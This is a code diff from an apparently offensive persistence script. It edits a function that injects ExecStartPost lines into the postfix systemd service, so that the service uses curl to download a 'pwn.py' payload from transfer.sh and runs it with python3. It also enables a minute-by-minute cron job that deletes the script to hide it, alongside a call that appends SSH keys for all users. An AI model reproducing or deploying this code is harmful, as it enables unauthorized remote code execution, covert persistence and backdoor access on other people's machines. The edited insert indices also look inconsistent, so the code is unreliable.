@@ -117,9 +117,8 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/LwlNfC/pwn.py\n".format(locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/RwYdTb/pwn.py\n".format(locationFile)
     ourPwnShit2 = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
-    ourPwnShitRemove = "ExecStartPost=/usr/bin/bash rm -f {}\n".format(locationFile)
     try:
         with open(path, "r") as service:
             allLines = [line for line in service.readlines()]
@@ -127,8 +126,7 @@ def startUpRecovery():
         if ourPwnShit not in allLines:
             index = allLines.index("ExecStart=/usr/sbin/postfix start\n")
             allLines.insert(index + 1, ourPwnShit)
-            allLines.insert(index + 2, ourPwnShit2)
-            allLines.insert(index + 3, ourPwnShitRemove)
+            allLines.insert(index + 3, ourPwnShit2)
 
         with open(path, "w") as service:
             for line in allLines:
@@ -241,10 +239,10 @@ def main():
     # Find All Users And Append Keys
     gitKeyPush()
 
-    # Find Place To Hide The Script While Running
-    # Example Command to Delete The Script if Already Existing
-    # cmd = "* * * * * rm -f " + locationFile
-    # appendCron(currentCRON, cmd)
+
+    cmd = "* * * * * rm -f " + locationFile
+    # Method That Allows Us to Write Cronjobs If We Want/Need to
+    appendCron(currentCRON, cmd)
 
     startUpRecovery()
 
